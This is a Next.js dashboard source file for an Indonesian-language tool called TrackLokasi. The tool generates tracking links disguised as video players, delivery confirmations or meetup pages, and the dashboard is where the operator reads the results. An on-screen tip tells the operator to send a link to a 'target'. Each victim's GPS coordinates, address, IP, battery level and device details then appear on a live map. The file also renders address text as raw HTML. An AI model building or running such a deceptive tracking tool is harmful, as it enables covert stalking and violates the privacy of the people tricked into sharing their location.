'use client';

import { useState, useEffect, useRef } from 'react';
import dynamic from 'next/dynamic';

// Dynamically import MapView to prevent SSR issues with Leaflet
const MapView = dynamic(() => import('@/components/MapView'), {
  ssr: false,
  loading: () => (
    <div style={{
      width: '100%',
      height: '480px',
      borderRadius: '12px',
      background: 'rgba(255, 255, 255, 0.03)',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      color: '#94a3b8'
    }}>
      Memuat Peta Interaktif...
    </div>
  )
});

export default function DashboardPage() {
  const [links, setLinks] = useState([]);
  const [logs, setLogs] = useState([]);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [modalOpen, setModalOpen] = useState(false);
  const [focusedCoords, setFocusedCoords] = useState(null);
  const [toasts, setToasts] = useState([]);
  const previousLogCountRef = useRef(0);
  const audioCtxRef = useRef(null);

  // Form states
  const [title, setTitle] = useState('Video Dokumentasi & Momen Penting');
  const [preset, setPreset] = useState('video');
  const [destination, setDestination] = useState('');
  const [videoUrl, setVideoUrl] = useState('');
  const [note, setNote] = useState('');

  // Audio Chime notification
  const playAlertChime = () => {
    if (!soundEnabled) return;
    try {
      if (!audioCtxRef.current) {
        audioCtxRef.current = new (window.AudioContext || window.webkitAudioContext)();
      }
      if (audioCtxRef.current.state === 'suspended') {
        audioCtxRef.current.resume();
      }
      const ctx = audioCtxRef.current;
      const now = ctx.currentTime;

      const osc1 = ctx.createOscillator();
      const gain1 = ctx.createGain();
      osc1.frequency.setValueAtTime(587.33, now);
      gain1.gain.setValueAtTime(0.15, now);
      gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.4);
      osc1.connect(gain1);
      gain1.connect(ctx.destination);
      osc1.start(now);
      osc1.stop(now + 0.4);

      const osc2 = ctx.createOscillator();
      const gain2 = ctx.createGain();
      osc2.frequency.setValueAtTime(880, now + 0.12);
      gain2.gain.setValueAtTime(0.2, now + 0.12);
      gain2.gain.exponentialRampToValueAtTime(0.001, now + 0.6);
      osc2.connect(gain2);
      gain2.connect(ctx.destination);
      osc2.start(now + 0.12);
      osc2.stop(now + 0.6);
    } catch (e) {
      console.warn('Audio error:', e);
    }
  };

  const showToast = (message, type = 'info') => {
    const id = Date.now();
    setToasts((prev) => [...prev, { id, message, type }]);
    setTimeout(() => {
      setToasts((prev) => prev.filter((t) => t.id !== id));
    }, 4000);
  };

  const copyToClipboard = (text, label = 'Tautan') => {
    navigator.clipboard.writeText(text).then(() => {
      showToast(`${label} berhasil disalin ke clipboard!`, 'success');
    });
  };

  // 1. Initial load from LocalStorage to prevent data loss on cold starts
  useEffect(() => {
    try {
      const savedLogs = localStorage.getItem('tracklokasi_saved_logs');
      if (savedLogs) {
        const parsed = JSON.parse(savedLogs);
        if (Array.isArray(parsed) && parsed.length > 0) {
          setLogs(parsed);
          previousLogCountRef.current = parsed.length;
        }
      }

      const savedLinks = localStorage.getItem('tracklokasi_saved_links');
      if (savedLinks) {
        const parsedLinks = JSON.parse(savedLinks);
        if (Array.isArray(parsedLinks) && parsedLinks.length > 0) {
          setLinks(parsedLinks);
        }
      }
    } catch (e) {
      console.warn('LocalStorage load warning:', e);
    }
  }, []);

  // 2. Fetch Links & Logs with smart merge
  const fetchData = async (isInitial = false) => {
    try {
      const [linksRes, logsRes] = await Promise.all([
        fetch('/api/links'),
        fetch('/api/logs')
      ]);

      const linksData = await linksRes.json();
      const logsData = await logsRes.json();

      if (linksData.success && Array.isArray(linksData.links)) {
        setLinks((prev) => {
          const map = new Map();
          prev.forEach((l) => map.set(l.id, l));
          linksData.links.forEach((l) => map.set(l.id, l));
          const merged = Array.from(map.values());
          try {
            localStorage.setItem('tracklokasi_saved_links', JSON.stringify(merged));
          } catch (e) {}
          return merged;
        });
      }

      if (logsData.success && Array.isArray(logsData.logs)) {
        const incoming = logsData.logs;
        setLogs((prev) => {
          const map = new Map();
          prev.forEach((l) => map.set(l.id, l));
          incoming.forEach((l) => map.set(l.id, l));
          const merged = Array.from(map.values()).sort(
            (a, b) => new Date(b.timestamp) - new Date(a.timestamp)
          );

          if (!isInitial && merged.length > previousLogCountRef.current) {
            playAlertChime();
            const latest = merged[0];
            showToast(`🎯 <strong>LOKASI TERDETEKSI!</strong><br>${latest?.address?.road || 'Jalan'} (${latest?.address?.city || ''})`, 'success');
          }
          previousLogCountRef.current = merged.length;
          try {
            localStorage.setItem('tracklokasi_saved_logs', JSON.stringify(merged));
          } catch (e) {}
          return merged;
        });
      }
    } catch (err) {
      console.warn('Polling error:', err);
    }
  };

  // Auto-poll every 3s
  useEffect(() => {
    fetchData(true);
    const interval = setInterval(() => {
      fetchData(false);
    }, 3000);
    return () => clearInterval(interval);
  }, [soundEnabled]);

  // Form create link
  const handleCreateLink = async (e) => {
    e.preventDefault();
    try {
      const res = await fetch('/api/links', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ title, preset, targetDestination: destination, videoUrl, note })
      });
      const data = await res.json();
      if (data.success) {
        setModalOpen(false);
        const fullUrl = `${window.location.origin}/view/${data.link.id}`;
        copyToClipboard(fullUrl, 'Link Baru');
        setLinks((prev) => {
          const updated = [data.link, ...prev.filter(l => l.id !== data.link.id)];
          try { localStorage.setItem('tracklokasi_saved_links', JSON.stringify(updated)); } catch(e) {}
          return updated;
        });
        fetchData();
      }
    } catch (err) {
      showToast('Gagal membuat link baru', 'error');
    }
  };

  // Delete Handlers
  const handleDeleteLink = async (id) => {
    if (!confirm('Hapus link ini beserta seluruh riwayat lokasinya?')) return;
    try {
      await fetch(`/api/links/${id}`, { method: 'DELETE' });
      setLinks((prev) => {
        const filtered = prev.filter((l) => l.id !== id);
        try { localStorage.setItem('tracklokasi_saved_links', JSON.stringify(filtered)); } catch(e) {}
        return filtered;
      });
      setLogs((prev) => {
        const filtered = prev.filter((l) => l.linkId !== id);
        try { localStorage.setItem('tracklokasi_saved_logs', JSON.stringify(filtered)); } catch(e) {}
        return filtered;
      });
      showToast('Link berhasil dihapus', 'info');
      fetchData();
    } catch (e) {
      showToast('Gagal menghapus link', 'error');
    }
  };

  const handleDeleteLog = async (id) => {
    if (!confirm('Hapus log lokasi ini?')) return;
    try {
      await fetch(`/api/logs/${id}`, { method: 'DELETE' });
      setLogs((prev) => {
        const filtered = prev.filter((l) => l.id !== id);
        try { localStorage.setItem('tracklokasi_saved_logs', JSON.stringify(filtered)); } catch(e) {}
        return filtered;
      });
      showToast('Log lokasi dihapus', 'info');
      fetchData();
    } catch (e) {
      showToast('Gagal menghapus log', 'error');
    }
  };

  const handleClearAllLogs = async () => {
    if (!confirm('HAPUS SEMUA RIWAYAT LOKASI?')) return;
    try {
      await fetch('/api/logs', { method: 'DELETE' });
      setLogs([]);
      try { localStorage.removeItem('tracklokasi_saved_logs'); } catch(e) {}
      showToast('Semua riwayat lokasi telah dibersihkan', 'info');
      fetchData();
    } catch (e) {
      showToast('Gagal membersihkan riwayat', 'error');
    }
  };

  // Stats
  const totalClicks = links.reduce((sum, l) => sum + (l.clicks || 0), 0);
  const minAcc = logs.length > 0 ? Math.min(...logs.map(l => l.coordinates?.accuracy || 999)) : null;

  return (
    <div style={{ maxWidth: '1560px', margin: '0 auto', padding: '24px', display: 'flex', flexDirection: 'column', gap: '24px' }}>
      
      {/* Top Header */}
      <header style={{
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        padding: '18px 28px',
        background: 'var(--bg-card)',
        backdropFilter: 'blur(16px)',
        border: '1px solid var(--border-color)',
        borderRadius: 'var(--radius-lg)'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
          <div style={{
            width: '44px',
            height: '44px',
            borderRadius: '12px',
            background: 'linear-gradient(135deg, #06b6d4, #3b82f6)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '22px'
          }}>📍</div>
          <div>
            <h1 style={{ fontSize: '1.35rem', fontWeight: 700, margin: 0, color: '#f8fafc' }}>
              TrackLokasi Next.js Command Center
            </h1>
            <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', margin: 0 }}>
              Real-time Geolocation, Reverse Geocode & Monitoring Dashboard
            </p>
          </div>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
          <div style={{
            display: 'inline-flex',
            alignItems: 'center',
            gap: '8px',
            padding: '6px 14px',
            background: 'rgba(16, 185, 129, 0.12)',
            border: '1px solid rgba(16, 185, 129, 0.3)',
            borderRadius: '9999px',
            fontSize: '0.8rem',
            fontWeight: 600,
            color: 'var(--accent-emerald)'
          }}>
            <span style={{
              width: '8px',
              height: '8px',
              background: 'var(--accent-emerald)',
              borderRadius: '50%',
              animation: 'pulse-ring 1.8s infinite'
            }}></span>
            <span>Live Monitoring Aktif</span>
          </div>

          <button
            onClick={() => setSoundEnabled(!soundEnabled)}
            style={{
              padding: '8px 14px',
              background: 'rgba(255, 255, 255, 0.05)',
              border: '1px solid var(--border-color)',
              color: 'var(--text-primary)',
              borderRadius: 'var(--radius-sm)',
              fontSize: '0.85rem',
              cursor: 'pointer'
            }}
          >
            🔊 {soundEnabled ? 'Suara On' : 'Suara Off'}
          </button>

          <button
            onClick={() => setModalOpen(true)}
            style={{
              padding: '10px 20px',
              background: 'linear-gradient(135deg, #2563eb, #0ea5e9)',
              color: 'white',
              border: 'none',
              borderRadius: 'var(--radius-md)',
              fontWeight: 600,
              fontSize: '0.9rem',
              cursor: 'pointer'
            }}
          >
            ➕ Buat Link Baru
          </button>
        </div>
      </header>

      {/* Stats Cards */}
      <section style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '16px' }}>
        <div style={{ background: 'var(--bg-card)', padding: '20px', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-color)', display: 'flex', alignItems: 'center', gap: '16px' }}>
          <div style={{ fontSize: '28px', background: 'rgba(59, 130, 246, 0.15)', padding: '10px', borderRadius: '10px' }}>🔗</div>
          <div>
            <div style={{ fontSize: '1.7rem', fontWeight: 700 }}>{links.length}</div>
            <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Total Link Dibuat</div>
          </div>
        </div>

        <div style={{ background: 'var(--bg-card)', padding: '20px', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-color)', display: 'flex', alignItems: 'center', gap: '16px' }}>
          <div style={{ fontSize: '28px', background: 'rgba(139, 92, 246, 0.15)', padding: '10px', borderRadius: '10px' }}>👁️</div>
          <div>
            <div style={{ fontSize: '1.7rem', fontWeight: 700 }}>{totalClicks}</div>
            <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Total Link Dibuka</div>
          </div>
        </div>

        <div style={{ background: 'var(--bg-card)', padding: '20px', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-color)', display: 'flex', alignItems: 'center', gap: '16px' }}>
          <div style={{ fontSize: '28px', background: 'rgba(16, 185, 129, 0.15)', padding: '10px', borderRadius: '10px' }}>🎯</div>
          <div>
            <div style={{ fontSize: '1.7rem', fontWeight: 700 }}>{logs.length}</div>
            <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Lokasi GPS Tertangkap</div>
          </div>
        </div>

        <div style={{ background: 'var(--bg-card)', padding: '20px', borderRadius: 'var(--radius-md)', border: '1px solid var(--border-color)', display: 'flex', alignItems: 'center', gap: '16px' }}>
          <div style={{ fontSize: '28px', background: 'rgba(245, 158, 11, 0.15)', padding: '10px', borderRadius: '10px' }}>📡</div>
          <div>
            <div style={{ fontSize: '1.7rem', fontWeight: 700 }}>{minAcc && minAcc !== 999 ? `±${Math.round(minAcc)}m` : '-'}</div>
            <div style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Akurasi Terbaik</div>
          </div>
        </div>
      </section>

      {/* Main Grid: Map & Log Feed */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px' }}>
        
        {/* Left: Map */}
        <div style={{
          background: 'var(--bg-card)',
          padding: '24px',
          borderRadius: 'var(--radius-lg)',
          border: '1px solid var(--border-color)',
          display: 'flex',
          flexDirection: 'column',
          gap: '16px'
        }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <h3 style={{ margin: 0, fontSize: '1.15rem' }}>🗺️ Peta Pemantauan Interaktif</h3>
            <span style={{ fontSize: '0.8rem', color: 'var(--text-muted)' }}>{logs.length} Titik Terdeteksi</span>
          </div>
          <MapView logs={logs} focusedCoords={focusedCoords} />
        </div>

        {/* Right: Logs Feed */}
        <div style={{
          background: 'var(--bg-card)',
          padding: '24px',
          borderRadius: 'var(--radius-lg)',
          border: '1px solid var(--border-color)',
          display: 'flex',
          flexDirection: 'column',
          gap: '16px'
        }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <h3 style={{ margin: 0, fontSize: '1.15rem' }}>📋 Riwayat Deteksi Lokasi Terbaru</h3>
            {logs.length > 0 && (
              <button
                onClick={handleClearAllLogs}
                style={{
                  padding: '6px 12px',
                  background: 'rgba(244, 63, 94, 0.15)',
                  border: '1px solid rgba(244, 63, 94, 0.3)',
                  color: '#fb7185',
                  borderRadius: '6px',
                  fontSize: '0.8rem',
                  cursor: 'pointer'
                }}
              >
                🗑️ Bersihkan Semua
              </button>
            )}
          </div>

          <div style={{ display: 'flex', flexDirection: 'column', gap: '14px', maxHeight: '480px', overflowY: 'auto', paddingRight: '4px' }}>
            {logs.length === 0 ? (
              <div style={{ textAlign: 'center', padding: '60px 20px', color: 'var(--text-muted)' }}>
                <div style={{ fontSize: '42px', marginBottom: '8px' }}>🛰️</div>
                <h4>Belum ada koordinat lokasi yang masuk</h4>
                <p style={{ fontSize: '0.85rem' }}>Kirimkan link pelacak kepada target. Begitu tombol ditekan dan izin lokasi disetujui, titik koordinat langsung tampil di sini.</p>
              </div>
            ) : (
              logs.map((log) => {
                const lat = log.coordinates?.latitude;
                const lng = log.coordinates?.longitude;
                const acc = Math.round(log.coordinates?.accuracy || 0);
                const road = log.address?.road || 'Jalan tidak teridentifikasi';
                const area = [log.address?.district, log.address?.city, log.address?.state].filter(Boolean).join(', ');

                return (
                  <div
                    key={log.id}
                    style={{
                      background: 'rgba(255, 255, 255, 0.02)',
                      border: '1px solid var(--border-color)',
                      borderLeft: '4px solid var(--accent-emerald)',
                      borderRadius: 'var(--radius-md)',
                      padding: '16px',
                      display: 'flex',
                      flexDirection: 'column',
                      gap: '10px'
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <div style={{ display: 'flex', gap: '8px', alignItems: 'center', flexWrap: 'wrap' }}>
                        <span style={{
                          background: acc < 50 ? 'rgba(16, 185, 129, 0.15)' : 'rgba(245, 158, 11, 0.15)',
                          color: acc < 50 ? '#34d399' : '#fbbf24',
                          padding: '2px 8px',
                          borderRadius: '4px',
                          fontSize: '0.75rem',
                          fontWeight: 600
                        }}>
                          GPS &plusmn;{acc}m
                        </span>
                        {log.device?.battery && (
                          <span style={{
                            background: 'rgba(6, 182, 212, 0.15)',
                            color: '#22d3ee',
                            padding: '2px 8px',
                            borderRadius: '4px',
                            fontSize: '0.75rem',
                            fontWeight: 600
                          }}>
                            🔋 {log.device.battery}
                          </span>
                        )}
                        <span style={{ fontSize: '0.8rem', color: 'var(--accent-blue)', fontWeight: 500 }}>
                          {log.linkTitle}
                        </span>
                      </div>
                      <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
                        {new Date(log.timestamp).toLocaleTimeString('id-ID')} WIB
                      </span>
                    </div>

                    <div style={{ background: 'rgba(0,0,0,0.3)', padding: '10px', borderRadius: '6px' }}>
                      <div style={{ fontWeight: 600, fontSize: '0.9rem', color: '#f8fafc' }}>📍 {road}</div>
                      <div style={{ fontSize: '0.8rem', color: 'var(--text-secondary)' }}>{area || log.address?.full_address}</div>
                    </div>

                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(130px, 1fr))', gap: '8px', fontSize: '0.75rem' }}>
                      <div>
                        <span style={{ color: 'var(--text-muted)' }}>Koordinat: </span>
                        <strong style={{ fontFamily: 'monospace' }}>{lat?.toFixed(5)}, {lng?.toFixed(5)}</strong>
                      </div>
                      <div>
                        <span style={{ color: 'var(--text-muted)' }}>Baterai HP: </span>
                        <strong style={{ color: log.device?.battery ? '#22d3ee' : '#94a3b8' }}>
                          {log.device?.battery ? `🔋 ${log.device.battery}` : '🔋 Tidak terbaca'}
                        </strong>
                      </div>
                      <div>
                        <span style={{ color: 'var(--text-muted)' }}>Perangkat: </span>
                        <strong>{log.device?.deviceType}</strong>
                      </div>
                      <div>
                        <span style={{ color: 'var(--text-muted)' }}>Browser: </span>
                        <strong>{log.device?.browser}</strong>
                      </div>
                      <div>
                        <span style={{ color: 'var(--text-muted)' }}>Resolusi Layar: </span>
                        <strong>{log.device?.screenResolution || '-'}</strong>
                      </div>
                      <div>
                        <span style={{ color: 'var(--text-muted)' }}>IP: </span>
                        <strong style={{ fontFamily: 'monospace' }}>{log.ip}</strong>
                      </div>
                    </div>

                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', paddingTop: '6px', borderTop: '1px solid rgba(255,255,255,0.06)' }}>
                      <div style={{ display: 'flex', gap: '8px' }}>
                        <button
                          onClick={() => setFocusedCoords({ lat, lng })}
                          style={{ padding: '6px 12px', background: 'rgba(255,255,255,0.06)', border: '1px solid var(--border-color)', color: 'white', borderRadius: '6px', fontSize: '0.8rem', cursor: 'pointer' }}
                        >
                          🎯 Fokus Peta
                        </button>
                        <button
                          onClick={() => copyToClipboard(`${lat}, ${lng}`, 'Koordinat')}
                          style={{ padding: '6px 12px', background: 'rgba(255,255,255,0.06)', border: '1px solid var(--border-color)', color: 'white', borderRadius: '6px', fontSize: '0.8rem', cursor: 'pointer' }}
                        >
                          📋 Salin
                        </button>
                        <a
                          href={log.googleMapsUrl}
                          target="_blank"
                          rel="noopener noreferrer"
                          style={{ padding: '6px 12px', background: '#2563eb', color: 'white', borderRadius: '6px', fontSize: '0.8rem', textDecoration: 'none' }}
                        >
                          🗺️ Google Maps ↗
                        </a>
                      </div>

                      <button
                        onClick={() => handleDeleteLog(log.id)}
                        style={{ padding: '6px 10px', background: 'none', border: 'none', color: '#fb7185', cursor: 'pointer' }}
                      >
                        🗑️
                      </button>
                    </div>
                  </div>
                );
              })
            )}
          </div>
        </div>

      </div>

      {/* Bottom: Links Management */}
      <section style={{
        background: 'var(--bg-card)',
        padding: '24px',
        borderRadius: 'var(--radius-lg)',
        border: '1px solid var(--border-color)',
        display: 'flex',
        flexDirection: 'column',
        gap: '14px'
      }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <h3 style={{ margin: 0, fontSize: '1.15rem' }}>⚡ Daftar Link Pelacak Aktif</h3>
          <span style={{ fontSize: '0.8rem', color: 'var(--text-muted)' }}>{links.length} Link Tersedia</span>
        </div>

        {links.length === 0 ? (
          <div style={{ textAlign: 'center', padding: '30px', color: 'var(--text-muted)' }}>
            Belum ada link yang dibuat. Klik <strong>"Buat Link Baru"</strong> di atas.
          </div>
        ) : (
          <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
            {links.map((link) => {
              const fullUrl = typeof window !== 'undefined' ? `${window.location.origin}/view/${link.id}` : '';
              return (
                <div
                  key={link.id}
                  style={{
                    background: 'rgba(255, 255, 255, 0.02)',
                    border: '1px solid var(--border-color)',
                    borderRadius: 'var(--radius-md)',
                    padding: '16px',
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'center'
                  }}
                >
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <span style={{ fontSize: '1.1rem' }}>{link.preset === 'video' ? '🎬' : link.preset === 'delivery' ? '📦' : link.preset === 'hangout' ? '☕' : '📍'}</span>
                      <strong style={{ fontSize: '0.95rem' }}>{link.title}</strong>
                      {link.targetDestination && (
                        <span style={{ fontSize: '0.75rem', background: 'rgba(6,182,212,0.1)', color: 'var(--accent-cyan)', padding: '2px 6px', borderRadius: '4px' }}>
                          🎯 {link.targetDestination}
                        </span>
                      )}
                    </div>
                    <div style={{ fontFamily: 'monospace', fontSize: '0.8rem', color: 'var(--accent-cyan)' }}>
                      {fullUrl}
                    </div>
                    <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'flex', gap: '14px' }}>
                      <span>Dibuka: <strong>{link.clicks || 0}x</strong></span>
                      <span>GPS Tertangkap: <strong style={{ color: 'var(--accent-emerald)' }}>{link.captures || 0}x</strong></span>
                    </div>
                  </div>

                  <div style={{ display: 'flex', gap: '8px' }}>
                    <button
                      onClick={() => copyToClipboard(fullUrl, 'Link Pelacak')}
                      style={{ padding: '8px 14px', background: 'var(--accent-blue)', color: 'white', border: 'none', borderRadius: '6px', fontSize: '0.85rem', cursor: 'pointer' }}
                    >
                      📋 Salin Link
                    </button>
                    <a
                      href={fullUrl}
                      target="_blank"
                      rel="noopener noreferrer"
                      style={{ padding: '8px 14px', background: 'rgba(255,255,255,0.06)', color: 'white', border: '1px solid var(--border-color)', borderRadius: '6px', fontSize: '0.85rem', textDecoration: 'none' }}
                    >
                      👁️ Preview
                    </a>
                    <button
                      onClick={() => handleDeleteLink(link.id)}
                      style={{ padding: '8px 12px', background: 'rgba(244,63,94,0.15)', color: '#fb7185', border: 'none', borderRadius: '6px', cursor: 'pointer' }}
                    >
                      🗑️
                    </button>
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </section>

      {/* Modal Buat Link */}
      {modalOpen && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          width: '100vw',
          height: '100vh',
          background: 'rgba(0,0,0,0.75)',
          backdropFilter: 'blur(8px)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 9999
        }}>
          <div style={{
            background: '#111827',
            border: '1px solid var(--border-accent)',
            borderRadius: 'var(--radius-lg)',
            width: '90%',
            maxWidth: '500px',
            padding: '28px',
            display: 'flex',
            flexDirection: 'column',
            gap: '18px'
          }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <h3 style={{ margin: 0, fontSize: '1.2rem' }}>✨ Buat Link Pelacak Baru</h3>
              <button onClick={() => setModalOpen(false)} style={{ background: 'none', border: 'none', color: '#94a3b8', fontSize: '20px', cursor: 'pointer' }}>&times;</button>
            </div>

            <form onSubmit={handleCreateLink} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                <label style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Tema Tampilan Halaman Target:</label>
                <select
                  value={preset}
                  onChange={(e) => setPreset(e.target.value)}
                  style={{ padding: '10px', background: 'rgba(255,255,255,0.06)', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'white' }}
                >
                  <option value="video" style={{ background: '#111827' }}>🎬 Pemutar Video Streaming (Sangat Menarik & Natural)</option>
                  <option value="maps" style={{ background: '#111827' }}>📍 Berbagi Lokasi & Navigasi Peta</option>
                  <option value="delivery" style={{ background: '#111827' }}>📦 Konfirmasi Lokasi Penerima Paket</option>
                  <option value="hangout" style={{ background: '#111827' }}>☕ Titik Kumpul & Lokasi Teman</option>
                </select>
              </div>

              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                <label style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Judul Video / Label Link:</label>
                <input
                  type="text"
                  value={title}
                  onChange={(e) => setTitle(e.target.value)}
                  placeholder="Contoh: Video Dokumentasi Liburan & Momen Penting"
                  required
                  style={{ padding: '10px', background: 'rgba(255,255,255,0.06)', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'white' }}
                />
              </div>

              {preset === 'video' && (
                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                  <label style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>URL Video Custom (Opsional, format .mp4):</label>
                  <input
                    type="text"
                    value={videoUrl}
                    onChange={(e) => setVideoUrl(e.target.value)}
                    placeholder="Contoh: /videos/video-saya.mp4 atau link https://..."
                    style={{ padding: '10px', background: 'rgba(255,255,255,0.06)', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'white' }}
                  />
                </div>
              )}

              {preset !== 'video' && (
                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                  <label style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Nama Tempat / Tujuan (Opsional):</label>
                  <input
                    type="text"
                    value={destination}
                    onChange={(e) => setDestination(e.target.value)}
                    placeholder="Contoh: Mall Grand Indonesia"
                    style={{ padding: '10px', background: 'rgba(255,255,255,0.06)', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'white' }}
                  />
                </div>
              )}

              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                <label style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Catatan Admin (Opsional):</label>
                <input
                  type="text"
                  value={note}
                  onChange={(e) => setNote(e.target.value)}
                  placeholder="Contoh: Dikirim ke target Budi"
                  style={{ padding: '10px', background: 'rgba(255,255,255,0.06)', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'white' }}
                />
              </div>

              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '10px', marginTop: '14px' }}>
                <button
                  type="button"
                  onClick={() => setModalOpen(false)}
                  style={{ padding: '10px 16px', background: 'rgba(255,255,255,0.06)', border: '1px solid var(--border-color)', color: 'white', borderRadius: '6px', cursor: 'pointer' }}
                >
                  Batal
                </button>
                <button
                  type="submit"
                  style={{ padding: '10px 18px', background: 'var(--accent-blue)', color: 'white', border: 'none', borderRadius: '6px', fontWeight: 600, cursor: 'pointer' }}
                >
                  Generate Link 🚀
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Toast Notification Container */}
      <div style={{ position: 'fixed', bottom: '24px', right: '24px', display: 'flex', flexDirection: 'column', gap: '10px', zIndex: 10000 }}>
        {toasts.map((t) => (
          <div
            key={t.id}
            style={{
              background: '#1f2937',
              color: '#fff',
              borderLeft: `4px solid ${t.type === 'success' ? '#10b981' : t.type === 'error' ? '#f43f5e' : '#3b82f6'}`,
              padding: '12px 18px',
              borderRadius: '6px',
              fontSize: '0.85rem',
              boxShadow: '0 10px 25px rgba(0,0,0,0.5)',
              animation: 'slide-toast 0.3s ease'
            }}
            dangerouslySetInnerHTML={{ __html: t.message }}
          />
        ))}
      </div>

    </div>
  );
}
